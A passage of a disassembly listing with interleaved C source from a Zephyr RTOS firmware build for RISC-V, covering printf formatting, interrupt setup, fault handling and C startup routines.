80002f5c:	0405                	addi	s0,s0,1
		char sign = 0;
80002f5e:	4b81                	li	s7,0
		const char *bpe = buf + sizeof(buf);
80002f60:	04a10b13          	addi	s6,sp,74
		const char *bps = NULL;
80002f64:	4a81                	li	s5,0
			break;
80002f66:	a231                	j	80003072 <z_cbvprintf_impl+0x410>
		case 's': {
			bps = (const char *)value->ptr;
80002f68:	4ac2                	lw	s5,16(sp)

			size_t len;

			if (precision >= 0) {
80002f6a:	000b4a63          	bltz	s6,80002f7e <z_cbvprintf_impl+0x31c>
				len = strnlen(bps, precision);
80002f6e:	85da                	mv	a1,s6
80002f70:	8556                	mv	a0,s5
80002f72:	692030ef          	jal	ra,80006604 <strnlen>
			} else {
				len = strlen(bps);
			}

			bpe = bps + len;
80002f76:	00aa8b33          	add	s6,s5,a0
		char sign = 0;
80002f7a:	4b81                	li	s7,0
			precision = -1;

			break;
80002f7c:	a8dd                	j	80003072 <z_cbvprintf_impl+0x410>
				len = strlen(bps);
80002f7e:	8556                	mv	a0,s5
80002f80:	5da030ef          	jal	ra,8000655a <strlen>
80002f84:	bfcd                	j	80002f76 <z_cbvprintf_impl+0x314>
		}
		case 'c':
			bps = buf;
			buf[0] = CHAR_IS_SIGNED ? value->sint : value->uint;
80002f86:	47c2                	lw	a5,16(sp)
80002f88:	02f10a23          	sb	a5,52(sp)
		char sign = 0;
80002f8c:	4b81                	li	s7,0
			bpe = buf + 1;
80002f8e:	03510b13          	addi	s6,sp,53
			bps = buf;
80002f92:	03410a93          	addi	s5,sp,52
			break;
80002f96:	a8f1                	j	80003072 <z_cbvprintf_impl+0x410>
		case 'd':
		case 'i':
			if (conv->flag_plus) {
80002f98:	02015783          	lhu	a5,32(sp)
80002f9c:	0087f713          	andi	a4,a5,8
80002fa0:	e709                	bnez	a4,80002faa <z_cbvprintf_impl+0x348>
				sign = '+';
			} else if (conv->flag_space) {
80002fa2:	8bc1                	andi	a5,a5,16
80002fa4:	ef81                	bnez	a5,80002fbc <z_cbvprintf_impl+0x35a>
		char sign = 0;
80002fa6:	4b81                	li	s7,0
80002fa8:	a019                	j	80002fae <z_cbvprintf_impl+0x34c>
				sign = '+';
80002faa:	02b00b93          	li	s7,43

			/* sint/uint overlay in the union, and so
			 * can't appear in read and write operations
			 * in the same statement.
			 */
			sint = value->sint;
80002fae:	4742                	lw	a4,16(sp)
80002fb0:	47d2                	lw	a5,20(sp)
			if (sint < 0) {
80002fb2:	0007c863          	bltz	a5,80002fc2 <z_cbvprintf_impl+0x360>
				sign = '-';
				value->uint = (uint_value_type)-sint;
			} else {
				value->uint = (uint_value_type)sint;
80002fb6:	c83a                	sw	a4,16(sp)
80002fb8:	ca3e                	sw	a5,20(sp)
80002fba:	a00d                	j	80002fdc <z_cbvprintf_impl+0x37a>
				sign = ' ';
80002fbc:	02000b93          	li	s7,32
80002fc0:	b7fd                	j	80002fae <z_cbvprintf_impl+0x34c>
				value->uint = (uint_value_type)-sint;
80002fc2:	40e006b3          	neg	a3,a4
80002fc6:	00e03733          	snez	a4,a4
80002fca:	40f007b3          	neg	a5,a5
80002fce:	8f99                	sub	a5,a5,a4
80002fd0:	c836                	sw	a3,16(sp)
80002fd2:	ca3e                	sw	a5,20(sp)
				sign = '-';
80002fd4:	02d00b93          	li	s7,45
80002fd8:	a011                	j	80002fdc <z_cbvprintf_impl+0x37a>
		switch (conv->specifier) {
80002fda:	4b81                	li	s7,0
			__fallthrough;
		case 'o':
		case 'u':
		case 'x':
		case 'X':
			bps = encode_uint(value->uint, conv, buf, bpe);
80002fdc:	04a10713          	addi	a4,sp,74
80002fe0:	1854                	addi	a3,sp,52
80002fe2:	1010                	addi	a2,sp,32
80002fe4:	4542                	lw	a0,16(sp)
80002fe6:	45d2                	lw	a1,20(sp)
80002fe8:	a89ff0ef          	jal	ra,80002a70 <encode_uint>
80002fec:	8aaa                	mv	s5,a0
			/* Update pad0 values based on precision and converted
			 * length.  Note that a non-empty sign is not in the
			 * converted sequence, but it does not affect the
			 * padding size.
			 */
			if (precision >= 0) {
80002fee:	0c0b4f63          	bltz	s6,800030cc <z_cbvprintf_impl+0x46a>
				size_t len = bpe - bps;
80002ff2:	04a10793          	addi	a5,sp,74
80002ff6:	415787b3          	sub	a5,a5,s5

				/* Zero-padding flag is ignored for integer
				 * conversions with precision.
				 */
				conv->flag_zero = false;
80002ffa:	02015703          	lhu	a4,32(sp)
80002ffe:	fbf77713          	andi	a4,a4,-65
80003002:	02e11023          	sh	a4,32(sp)

				/* Set pad0_value to satisfy precision */
				if (len < (size_t)precision) {
80003006:	0d67f663          	bgeu	a5,s6,800030d2 <z_cbvprintf_impl+0x470>
					conv->pad0_value = precision - (int)len;
8000300a:	40fb07b3          	sub	a5,s6,a5
8000300e:	d23e                	sw	a5,36(sp)
		const char *bpe = buf + sizeof(buf);
80003010:	04a10b13          	addi	s6,sp,74
80003014:	a8b9                	j	80003072 <z_cbvprintf_impl+0x410>
		case 'p':
			/* Implementation-defined: null is "(nil)", non-null
			 * has 0x prefix followed by significant address hex
			 * digits, no leading zeros.
			 */
			if (value->ptr != NULL) {
80003016:	4542                	lw	a0,16(sp)
80003018:	e919                	bnez	a0,8000302e <z_cbvprintf_impl+0x3cc>
		char sign = 0;
8000301a:	4b81                	li	s7,0

				goto prec_int_pad0;
			}

			bps = "(nil)";
			bpe = bps + 5;
8000301c:	80008b37          	lui	s6,0x80008
80003020:	e91b0b13          	addi	s6,s6,-367 # 80007e91 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007e92>
			bps = "(nil)";
80003024:	80008ab7          	lui	s5,0x80008
80003028:	e8ca8a93          	addi	s5,s5,-372 # 80007e8c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007e8d>
8000302c:	a099                	j	80003072 <z_cbvprintf_impl+0x410>
				bps = encode_uint((uintptr_t)value->ptr, conv,
8000302e:	04a10713          	addi	a4,sp,74
80003032:	1854                	addi	a3,sp,52
80003034:	1010                	addi	a2,sp,32
80003036:	4581                	li	a1,0
80003038:	a39ff0ef          	jal	ra,80002a70 <encode_uint>
8000303c:	8aaa                	mv	s5,a0
				conv->altform_0c = true;
8000303e:	02214783          	lbu	a5,34(sp)
80003042:	0107e793          	ori	a5,a5,16
80003046:	02f10123          	sb	a5,34(sp)
				conv->specifier = 'x';
8000304a:	07800793          	li	a5,120
8000304e:	02f101a3          	sb	a5,35(sp)
		char sign = 0;
80003052:	4b81                	li	s7,0
				goto prec_int_pad0;
80003054:	bf69                	j	80002fee <z_cbvprintf_impl+0x38c>

			break;
		case 'n':
			if (IS_ENABLED(CONFIG_CBPRINTF_N_SPECIFIER)) {
				store_count(conv, value->ptr, count);
80003056:	8622                	mv	a2,s0
80003058:	45c2                	lw	a1,16(sp)
8000305a:	1008                	addi	a0,sp,32
8000305c:	b27ff0ef          	jal	ra,80002b82 <store_count>
		char sign = 0;
80003060:	4b81                	li	s7,0
		const char *bpe = buf + sizeof(buf);
80003062:	04a10b13          	addi	s6,sp,74
		const char *bps = NULL;
80003066:	4a81                	li	s5,0
			}

			break;
80003068:	a029                	j	80003072 <z_cbvprintf_impl+0x410>
		switch (conv->specifier) {
8000306a:	4b81                	li	s7,0
8000306c:	04a10b13          	addi	s6,sp,74
80003070:	4a81                	li	s5,0
		}

		/* If we don't have a converted value to emit, move
		 * on.
		 */
		if (bps == NULL) {
80003072:	120a8063          	beqz	s5,80003192 <z_cbvprintf_impl+0x530>
		 *   * any exponent content from the converted value
		 * * for non-FP:
		 *   * any pad0_prefix
		 *   * the converted value
		 */
		size_t nj_len = (bpe - bps);
80003076:	415b06b3          	sub	a3,s6,s5
		int pad_len = 0;

		if (sign != 0) {
8000307a:	000b8363          	beqz	s7,80003080 <z_cbvprintf_impl+0x41e>
			nj_len += 1U;
8000307e:	0685                	addi	a3,a3,1
		}

		if (conv->altform_0c) {
80003080:	02214783          	lbu	a5,34(sp)
80003084:	0107f713          	andi	a4,a5,16
80003088:	cb21                	beqz	a4,800030d8 <z_cbvprintf_impl+0x476>
			nj_len += 2U;
8000308a:	0689                	addi	a3,a3,2
		} else if (conv->altform_0) {
			nj_len += 1U;
		}

		nj_len += conv->pad0_value;
8000308c:	5712                	lw	a4,36(sp)
8000308e:	9736                	add	a4,a4,a3
		if (conv->pad_fp) {
80003090:	0407f793          	andi	a5,a5,64
80003094:	c399                	beqz	a5,8000309a <z_cbvprintf_impl+0x438>
			nj_len += conv->pad0_pre_exp;
80003096:	57a2                	lw	a5,40(sp)
80003098:	973e                	add	a4,a4,a5
		 * result in no padding.
		 *
		 * If a non-negative padding width is present and we're doing
		 * right-justification, emit the padding now.
		 */
		if (width > 0) {
8000309a:	07405663          	blez	s4,80003106 <z_cbvprintf_impl+0x4a4>
			width -= (int)nj_len;
8000309e:	40ea0a33          	sub	s4,s4,a4

			if (!conv->flag_dash) {
800030a2:	5782                	lw	a5,32(sp)
800030a4:	8389                	srli	a5,a5,0x2
800030a6:	8b85                	andi	a5,a5,1
800030a8:	efb9                	bnez	a5,80003106 <z_cbvprintf_impl+0x4a4>
				char pad = ' ';

				/* If we're zero-padding we have to emit the
				 * sign first.
				 */
				if (conv->flag_zero) {
800030aa:	02015783          	lhu	a5,32(sp)
800030ae:	0407f793          	andi	a5,a5,64
800030b2:	cb85                	beqz	a5,800030e2 <z_cbvprintf_impl+0x480>
					if (sign != 0) {
800030b4:	020b8a63          	beqz	s7,800030e8 <z_cbvprintf_impl+0x486>
						OUTC(sign);
800030b8:	85a6                	mv	a1,s1
800030ba:	855e                	mv	a0,s7
800030bc:	9902                	jalr	s2
800030be:	0c054d63          	bltz	a0,80003198 <z_cbvprintf_impl+0x536>
800030c2:	0405                	addi	s0,s0,1
						sign = 0;
					}
					pad = '0';
800030c4:	03000c13          	li	s8,48
						sign = 0;
800030c8:	4b81                	li	s7,0
800030ca:	a00d                	j	800030ec <z_cbvprintf_impl+0x48a>
		const char *bpe = buf + sizeof(buf);
800030cc:	04a10b13          	addi	s6,sp,74
800030d0:	b74d                	j	80003072 <z_cbvprintf_impl+0x410>
800030d2:	04a10b13          	addi	s6,sp,74
800030d6:	bf71                	j	80003072 <z_cbvprintf_impl+0x410>
		} else if (conv->altform_0) {
800030d8:	0087f713          	andi	a4,a5,8
800030dc:	db45                	beqz	a4,8000308c <z_cbvprintf_impl+0x42a>
			nj_len += 1U;
800030de:	0685                	addi	a3,a3,1
800030e0:	b775                	j	8000308c <z_cbvprintf_impl+0x42a>
				char pad = ' ';
800030e2:	02000c13          	li	s8,32
800030e6:	a019                	j	800030ec <z_cbvprintf_impl+0x48a>
					pad = '0';
800030e8:	03000c13          	li	s8,48
800030ec:	87d2                	mv	a5,s4
				}

				while (width-- > 0) {
800030ee:	fff78a13          	addi	s4,a5,-1
800030f2:	00f05a63          	blez	a5,80003106 <z_cbvprintf_impl+0x4a4>
					OUTC(pad);
800030f6:	85a6                	mv	a1,s1
800030f8:	8562                	mv	a0,s8
800030fa:	9902                	jalr	s2
800030fc:	08054e63          	bltz	a0,80003198 <z_cbvprintf_impl+0x536>
80003100:	0405                	addi	s0,s0,1
				while (width-- > 0) {
80003102:	87d2                	mv	a5,s4
80003104:	b7ed                	j	800030ee <z_cbvprintf_impl+0x48c>
		}

		/* If we have a sign that hasn't been emitted, now's the
		 * time....
		 */
		if (sign != 0) {
80003106:	000b8863          	beqz	s7,80003116 <z_cbvprintf_impl+0x4b4>
			OUTC(sign);
8000310a:	85a6                	mv	a1,s1
8000310c:	855e                	mv	a0,s7
8000310e:	9902                	jalr	s2
80003110:	08054463          	bltz	a0,80003198 <z_cbvprintf_impl+0x536>
80003114:	0405                	addi	s0,s0,1
				OUTC('0');
			}

			OUTS(cp, bpe);
		} else {
			if (conv->altform_0c | conv->altform_0) {
80003116:	5782                	lw	a5,32(sp)
80003118:	0147d713          	srli	a4,a5,0x14
8000311c:	8b05                	andi	a4,a4,1
8000311e:	83cd                	srli	a5,a5,0x13
80003120:	8b85                	andi	a5,a5,1
80003122:	8fd9                	or	a5,a5,a4
80003124:	cb81                	beqz	a5,80003134 <z_cbvprintf_impl+0x4d2>
				OUTC('0');
80003126:	85a6                	mv	a1,s1
80003128:	03000513          	li	a0,48
8000312c:	9902                	jalr	s2
8000312e:	06054563          	bltz	a0,80003198 <z_cbvprintf_impl+0x536>
80003132:	0405                	addi	s0,s0,1
			}

			if (conv->altform_0c) {
80003134:	02214783          	lbu	a5,34(sp)
80003138:	8bc1                	andi	a5,a5,16
8000313a:	cb81                	beqz	a5,8000314a <z_cbvprintf_impl+0x4e8>
				OUTC(conv->specifier);
8000313c:	85a6                	mv	a1,s1
8000313e:	02314503          	lbu	a0,35(sp)
80003142:	9902                	jalr	s2
80003144:	04054a63          	bltz	a0,80003198 <z_cbvprintf_impl+0x536>
80003148:	0405                	addi	s0,s0,1
			}

			pad_len = conv->pad0_value;
8000314a:	5792                	lw	a5,36(sp)
			while (pad_len-- > 0) {
8000314c:	fff78b93          	addi	s7,a5,-1
80003150:	00f05b63          	blez	a5,80003166 <z_cbvprintf_impl+0x504>
				OUTC('0');
80003154:	85a6                	mv	a1,s1
80003156:	03000513          	li	a0,48
8000315a:	9902                	jalr	s2
8000315c:	02054e63          	bltz	a0,80003198 <z_cbvprintf_impl+0x536>
80003160:	0405                	addi	s0,s0,1
			while (pad_len-- > 0) {
80003162:	87de                	mv	a5,s7
80003164:	b7e5                	j	8000314c <z_cbvprintf_impl+0x4ea>
			}

			OUTS(bps, bpe);
80003166:	86da                	mv	a3,s6
80003168:	8656                	mv	a2,s5
8000316a:	85a6                	mv	a1,s1
8000316c:	854a                	mv	a0,s2
8000316e:	a89ff0ef          	jal	ra,80002bf6 <outs>
80003172:	02054363          	bltz	a0,80003198 <z_cbvprintf_impl+0x536>
80003176:	942a                	add	s0,s0,a0
		}

		/* Finish left justification */
		while (width > 0) {
80003178:	01405b63          	blez	s4,8000318e <z_cbvprintf_impl+0x52c>
			OUTC(' ');
8000317c:	85a6                	mv	a1,s1
8000317e:	02000513          	li	a0,32
80003182:	9902                	jalr	s2
80003184:	00054a63          	bltz	a0,80003198 <z_cbvprintf_impl+0x536>
80003188:	0405                	addi	s0,s0,1
			--width;
8000318a:	1a7d                	addi	s4,s4,-1
8000318c:	b7f5                	j	80003178 <z_cbvprintf_impl+0x516>
		fp = extract_conversion(conv, sp);
8000318e:	8ace                	mv	s5,s3
80003190:	bcfd                	j	80002c8e <z_cbvprintf_impl+0x2c>
80003192:	8ace                	mv	s5,s3
80003194:	bced                	j	80002c8e <z_cbvprintf_impl+0x2c>
		}
	}

	return count;
80003196:	8522                	mv	a0,s0
#undef OUTS
#undef OUTC
}
80003198:	8000c7b7          	lui	a5,0x8000c
8000319c:	4736                	lw	a4,76(sp)
8000319e:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800031a2:	8fb9                	xor	a5,a5,a4
800031a4:	4701                	li	a4,0
800031a6:	ef89                	bnez	a5,800031c0 <z_cbvprintf_impl+0x55e>
800031a8:	50f6                	lw	ra,124(sp)
800031aa:	5466                	lw	s0,120(sp)
800031ac:	54d6                	lw	s1,116(sp)
800031ae:	5946                	lw	s2,112(sp)
800031b0:	59b6                	lw	s3,108(sp)
800031b2:	5a26                	lw	s4,104(sp)
800031b4:	5a96                	lw	s5,100(sp)
800031b6:	5b06                	lw	s6,96(sp)
800031b8:	4bf6                	lw	s7,92(sp)
800031ba:	4c66                	lw	s8,88(sp)
800031bc:	6109                	addi	sp,sp,128
800031be:	8082                	ret
800031c0:	333020ef          	jal	ra,80005cf2 <_StackCheckHandler>

800031c4 <_ConfigAbsSyms>:

/* file is auto-generated, do not modify ! */

#include <zephyr/toolchain.h>

GEN_ABS_SYM_BEGIN (_ConfigAbsSyms)
800031c4:	1101                	addi	sp,sp,-32
800031c6:	ce06                	sw	ra,28(sp)
800031c8:	8000c7b7          	lui	a5,0x8000c
800031cc:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800031d0:	c63a                	sw	a4,12(sp)
800031d2:	4701                	li	a4,0
GEN_ABSOLUTE_SYM_KCONFIG(CONFIG_OUTPUT_PRINT_MEMORY_USAGE, 1);
GEN_ABSOLUTE_SYM_KCONFIG(CONFIG_WARN_DEPRECATED, 1);
GEN_ABSOLUTE_SYM_KCONFIG(CONFIG_ENFORCE_ZEPHYR_STDINT, 1);
GEN_ABSOLUTE_SYM_KCONFIG(CONFIG_COMPAT_INCLUDES, 1);

GEN_ABS_SYM_END
800031d4:	4732                	lw	a4,12(sp)
800031d6:	9507a783          	lw	a5,-1712(a5)
800031da:	8fb9                	xor	a5,a5,a4
800031dc:	4701                	li	a4,0
800031de:	e781                	bnez	a5,800031e6 <_ConfigAbsSyms+0x22>
800031e0:	40f2                	lw	ra,28(sp)
800031e2:	6105                	addi	sp,sp,32
800031e4:	8082                	ret
800031e6:	30d020ef          	jal	ra,80005cf2 <_StackCheckHandler>

800031ea <arch_cpu_idle>:
 * This function will be called by the kernel idle loop or possibly within
 * an implementation of _pm_save_idle in the kernel when the
 * '_pm_save_flag' variable is non-zero.
 */
void arch_cpu_idle(void)
{
800031ea:	1101                	addi	sp,sp,-32
800031ec:	ce06                	sw	ra,28(sp)
800031ee:	cc22                	sw	s0,24(sp)
800031f0:	8000c437          	lui	s0,0x8000c
800031f4:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800031f8:	c63e                	sw	a5,12(sp)
800031fa:	4781                	li	a5,0
	sys_trace_idle();
800031fc:	28e1                	jal	800032d4 <sys_trace_idle>
 * use atomic instruction csrs to unlock global irq
 * csrs: atomic set bits in CSR register
 */
static ALWAYS_INLINE void arch_irq_unlock(unsigned int key)
{
	__asm__ volatile ("csrs mstatus, %0"
800031fe:	47a1                	li	a5,8
80003200:	3007a073          	csrs	mstatus,a5
	__asm__ volatile("wfi");
80003204:	10500073          	wfi
	riscv_idle(MSTATUS_IEN);
}
80003208:	4732                	lw	a4,12(sp)
8000320a:	95042783          	lw	a5,-1712(s0)
8000320e:	8fb9                	xor	a5,a5,a4
80003210:	4701                	li	a4,0
80003212:	e789                	bnez	a5,8000321c <arch_cpu_idle+0x32>
80003214:	40f2                	lw	ra,28(sp)
80003216:	4462                	lw	s0,24(sp)
80003218:	6105                	addi	sp,sp,32
8000321a:	8082                	ret
8000321c:	2d7020ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003220 <arch_irq_enable>:
}

#else /* PLIC + HLINT/CLINT or HLINT/CLINT only */

void arch_irq_enable(unsigned int irq)
{
80003220:	1101                	addi	sp,sp,-32
80003222:	ce06                	sw	ra,28(sp)
80003224:	8000c7b7          	lui	a5,0x8000c
80003228:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000322c:	c63a                	sw	a4,12(sp)
8000322e:	4701                	li	a4,0
{
#if defined(CONFIG_3RD_LEVEL_INTERRUPTS)
	return ((irq >> 16) & 0xFF) != 0 ? 3 :
		(((irq >> 8) & 0xFF) == 0 ? 1 : 2);
#elif defined(CONFIG_2ND_LEVEL_INTERRUPTS)
	return ((irq >> 8) & 0xFF) == 0 ? 1 : 2;
80003230:	00855793          	srli	a5,a0,0x8
80003234:	0ff7f713          	zext.b	a4,a5
80003238:	e30d                	bnez	a4,8000325a <arch_irq_enable+0x3a>
	 * CSR mie register is updated using atomic instruction csrrs
	 * (atomic read and set bits in CSR register)
	 */
	__asm__ volatile ("csrrs %0, mie, %1\n"
			  : "=r" (mie)
			  : "r" (1 << irq));
8000323a:	4785                	li	a5,1
8000323c:	00a797b3          	sll	a5,a5,a0
	__asm__ volatile ("csrrs %0, mie, %1\n"
80003240:	3047a7f3          	csrrs	a5,mie,a5
}
80003244:	8000c7b7          	lui	a5,0x8000c
80003248:	4732                	lw	a4,12(sp)
8000324a:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000324e:	8fb9                	xor	a5,a5,a4
80003250:	4701                	li	a4,0
80003252:	eb89                	bnez	a5,80003264 <arch_irq_enable+0x44>
80003254:	40f2                	lw	ra,28(sp)
80003256:	6105                	addi	sp,sp,32
80003258:	8082                	ret
		riscv_plic_irq_enable(irq);
8000325a:	fff78513          	addi	a0,a5,-1
8000325e:	03f000ef          	jal	ra,80003a9c <riscv_plic_irq_enable>
		return;
80003262:	b7cd                	j	80003244 <arch_irq_enable+0x24>
}
80003264:	28f020ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003268 <z_riscv_irq_priority_set>:
	return !!(mie & (1 << irq));
}

#if defined(CONFIG_RISCV_HAS_PLIC)
void z_riscv_irq_priority_set(unsigned int irq, unsigned int prio, uint32_t flags)
{
80003268:	1101                	addi	sp,sp,-32
8000326a:	ce06                	sw	ra,28(sp)
8000326c:	8000c7b7          	lui	a5,0x8000c
80003270:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003274:	c63a                	sw	a4,12(sp)
80003276:	4701                	li	a4,0
80003278:	8121                	srli	a0,a0,0x8
8000327a:	0ff57793          	zext.b	a5,a0
8000327e:	ef81                	bnez	a5,80003296 <z_riscv_irq_priority_set+0x2e>

	if (level == 2) {
		irq = irq_from_level_2(irq);
		riscv_plic_set_priority(irq, prio);
	}
}
80003280:	8000c7b7          	lui	a5,0x8000c
80003284:	4732                	lw	a4,12(sp)
80003286:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000328a:	8fb9                	xor	a5,a5,a4
8000328c:	4701                	li	a4,0
8000328e:	eb81                	bnez	a5,8000329e <z_riscv_irq_priority_set+0x36>
80003290:	40f2                	lw	ra,28(sp)
80003292:	6105                	addi	sp,sp,32
80003294:	8082                	ret
		riscv_plic_set_priority(irq, prio);
80003296:	157d                	addi	a0,a0,-1
80003298:	04f000ef          	jal	ra,80003ae6 <riscv_plic_set_priority>
}
8000329c:	b7d5                	j	80003280 <z_riscv_irq_priority_set+0x18>
8000329e:	255020ef          	jal	ra,80005cf2 <_StackCheckHandler>

800032a2 <soc_interrupt_init>:
#endif /* CONFIG_RISCV_HAS_PLIC */
#endif /* CONFIG_RISCV_HAS_CLIC */

#if defined(CONFIG_RISCV_SOC_INTERRUPT_INIT)
__weak void soc_interrupt_init(void)
{
800032a2:	1101                	addi	sp,sp,-32
800032a4:	ce06                	sw	ra,28(sp)
800032a6:	8000c7b7          	lui	a5,0x8000c
800032aa:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800032ae:	c63a                	sw	a4,12(sp)
800032b0:	4701                	li	a4,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
800032b2:	30047773          	csrrci	a4,mstatus,8
	/* ensure that all interrupts are disabled */
	(void)arch_irq_lock();

	__asm__ volatile ("csrwi mie, 0\n"
800032b6:	30405073          	csrwi	mie,0
800032ba:	34405073          	csrwi	mip,0
			  "csrwi mip, 0\n");
}
800032be:	4732                	lw	a4,12(sp)
800032c0:	9507a783          	lw	a5,-1712(a5)
800032c4:	8fb9                	xor	a5,a5,a4
800032c6:	4701                	li	a4,0
800032c8:	e781                	bnez	a5,800032d0 <soc_interrupt_init+0x2e>
800032ca:	40f2                	lw	ra,28(sp)
800032cc:	6105                	addi	sp,sp,32
800032ce:	8082                	ret
800032d0:	223020ef          	jal	ra,80005cf2 <_StackCheckHandler>

800032d4 <sys_trace_idle>:

void sys_trace_isr_exit(void) {}

void sys_trace_isr_exit_to_scheduler(void) {}

void sys_trace_idle(void) {}
800032d4:	1101                	addi	sp,sp,-32
800032d6:	ce06                	sw	ra,28(sp)
800032d8:	8000c7b7          	lui	a5,0x8000c
800032dc:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800032e0:	c63a                	sw	a4,12(sp)
800032e2:	4701                	li	a4,0
800032e4:	4732                	lw	a4,12(sp)
800032e6:	9507a783          	lw	a5,-1712(a5)
800032ea:	8fb9                	xor	a5,a5,a4
800032ec:	4701                	li	a4,0
800032ee:	e781                	bnez	a5,800032f6 <sys_trace_idle+0x22>
800032f0:	40f2                	lw	ra,28(sp)
800032f2:	6105                	addi	sp,sp,32
800032f4:	8082                	ret
800032f6:	1fd020ef          	jal	ra,80005cf2 <_StackCheckHandler>

800032fa <bad_stack_pointer>:
		return "unknown";
	}
}

static bool bad_stack_pointer(z_arch_esf_t *esf)
{
800032fa:	1101                	addi	sp,sp,-32
800032fc:	ce06                	sw	ra,28(sp)
800032fe:	8000c7b7          	lui	a5,0x8000c
80003302:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003306:	c63a                	sw	a4,12(sp)
80003308:	4701                	li	a4,0
		return true;
	}
#endif

	return false;
}
8000330a:	4732                	lw	a4,12(sp)
8000330c:	9507a783          	lw	a5,-1712(a5)
80003310:	8fb9                	xor	a5,a5,a4
80003312:	4701                	li	a4,0
80003314:	e789                	bnez	a5,8000331e <bad_stack_pointer+0x24>
80003316:	4501                	li	a0,0
80003318:	40f2                	lw	ra,28(sp)
8000331a:	6105                	addi	sp,sp,32
8000331c:	8082                	ret
8000331e:	1d5020ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003322 <z_riscv_fatal_error>:
{
80003322:	1101                	addi	sp,sp,-32
80003324:	ce06                	sw	ra,28(sp)
80003326:	8000c7b7          	lui	a5,0x8000c
8000332a:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000332e:	c63a                	sw	a4,12(sp)
80003330:	4701                	li	a4,0
	z_fatal_error(reason, esf);
80003332:	0da010ef          	jal	ra,8000440c <z_fatal_error>

80003336 <_Fault>:

void _Fault(z_arch_esf_t *esf)
{
80003336:	1101                	addi	sp,sp,-32
80003338:	ce06                	sw	ra,28(sp)
8000333a:	cc22                	sw	s0,24(sp)
8000333c:	842a                	mv	s0,a0
8000333e:	8000c7b7          	lui	a5,0x8000c
80003342:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003346:	c63a                	sw	a4,12(sp)
80003348:	4701                	li	a4,0
	}
#endif /* CONFIG_USERSPACE */

	unsigned long mcause;

	__asm__ volatile("csrr %0, mcause" : "=r" (mcause));
8000334a:	342027f3          	csrr	a5,mcause

#ifndef CONFIG_SOC_OPENISA_RV32M1_RISCV32
	unsigned long mtval;
	__asm__ volatile("csrr %0, mtval" : "=r" (mtval));
8000334e:	343027f3          	csrr	a5,mtval
	LOG_ERR("  mtval: %lx", mtval);
#endif

	unsigned int reason = K_ERR_CPU_EXCEPTION;

	if (bad_stack_pointer(esf)) {
80003352:	3765                	jal	800032fa <bad_stack_pointer>
80003354:	c111                	beqz	a0,80003358 <_Fault+0x22>
		reason = K_ERR_STACK_CHK_FAIL;
80003356:	4509                	li	a0,2
	}

	z_riscv_fatal_error(reason, esf);
80003358:	85a2                	mv	a1,s0
8000335a:	37e1                	jal	80003322 <z_riscv_fatal_error>

8000335c <z_irq_spurious>:
#include <kernel_internal.h>
#include <zephyr/logging/log.h>
LOG_MODULE_DECLARE(os, CONFIG_KERNEL_LOG_LEVEL);

FUNC_NORETURN void z_irq_spurious(const void *unused)
{
8000335c:	1101                	addi	sp,sp,-32
8000335e:	ce06                	sw	ra,28(sp)
80003360:	8000c7b7          	lui	a5,0x8000c
80003364:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003368:	c63a                	sw	a4,12(sp)
8000336a:	4701                	li	a4,0
	unsigned long mcause;

	ARG_UNUSED(unused);

	__asm__ volatile("csrr %0, mcause" : "=r" (mcause));
8000336c:	342027f3          	csrr	a5,mcause
	if (mcause == RISCV_MACHINE_EXT_IRQ) {
		LOG_ERR("PLIC interrupt line causing the IRQ: %d",
			riscv_plic_get_irq());
	}
#endif
	z_riscv_fatal_error(K_ERR_SPURIOUS_IRQ, NULL);
80003370:	4581                	li	a1,0
80003372:	4505                	li	a0,1
80003374:	377d                	jal	80003322 <z_riscv_fatal_error>

80003376 <_PrepC>:
 *
 * This routine prepares for the execution of and runs C code.
 */

void _PrepC(void)
{
80003376:	1101                	addi	sp,sp,-32
80003378:	ce06                	sw	ra,28(sp)
8000337a:	8000c7b7          	lui	a5,0x8000c
8000337e:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003382:	c63a                	sw	a4,12(sp)
80003384:	4701                	li	a4,0
	z_bss_zero();
80003386:	274010ef          	jal	ra,800045fa <z_bss_zero>
	z_data_copy();
#if defined(CONFIG_RISCV_SOC_INTERRUPT_INIT)
	soc_interrupt_init();
8000338a:	3f21                	jal	800032a2 <soc_interrupt_init>
#endif
	z_cstart();
8000338c:	3ee010ef          	jal	ra,8000477a <z_cstart>

80003390 <z_riscv_secondary_cpu_init>:
		;
	}
}

void z_riscv_secondary_cpu_init(int cpu_num)
{
80003390:	1101                	addi	sp,sp,-32
80003392:	ce06                	sw	ra,28(sp)
80003394:	cc22                	sw	s0,24(sp)
80003396:	8000c7b7          	lui	a5,0x8000c
